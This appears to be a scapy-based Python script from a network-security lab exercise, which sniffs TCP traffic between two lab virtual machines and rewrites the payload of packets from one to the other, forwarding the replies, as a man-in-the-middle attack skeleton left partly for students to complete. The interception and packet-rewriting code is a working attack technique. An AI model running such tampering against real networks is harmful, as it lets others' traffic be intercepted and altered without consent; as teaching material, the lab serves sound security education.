#!/usr/bin/env python
from scapy.all import *

import uuid

VM_A_IP = "172.16.133.128" 
VM_B_IP = "172.16.133.129"

def get_mac_address(): 
    mac=uuid.UUID(int = uuid.getnode()).hex[-12:] 
    return ":".join([mac[e:e+2] for e in range(0,11,2)])

local_mac=get_mac_address()
def spoof_pkt(pkt):
    if pkt[IP].src == VM_A_IP and pkt[IP].dst == VM_B_IP \
        and pkt[TCP].payload:
        if pkt[Ether].dst=='00:0c:29:70:30:23':
            print ('A to B',pkt[TCP].payload.load)
            #pkt.show()
            # Create a new packet based on the captured one.
            # (1) We need to delete the checksum fields in the IP and TCP headers,
            # because our modification will make them invalid.
            # Scapy will recalculate them for us if these fields are missing.
            # (2) We also delete the original TCP payload.
            #Ether=Ether(src=local_mac,dst=pkt[Ether].dst)
            newpkt = IP(pkt[IP])
            del(newpkt.chksum)
            del(newpkt[TCP].chksum)
            del(newpkt[TCP].payload)

            #####################################################################
            # Construct the new payload based on the old payload.
            # Students need to implement this part.
            olddata = pkt[TCP].payload.load # Get the original payload data

            newdata = 'Z' # No change is made in this sample code
            #####################################################################
            # Attach the new data and set the packet out
            send(newpkt/newdata)
    elif pkt[IP].src == VM_B_IP and pkt[IP].dst == VM_A_IP:
        if pkt[Ether].dst=='00:0c:29:70:30:23':
            print ('B to A',pkt[TCP].payload)
            #pkt.show()
            send(pkt[IP]) # Forward the original packet
pkt = sniff(filter='tcp',prn=spoof_pkt)

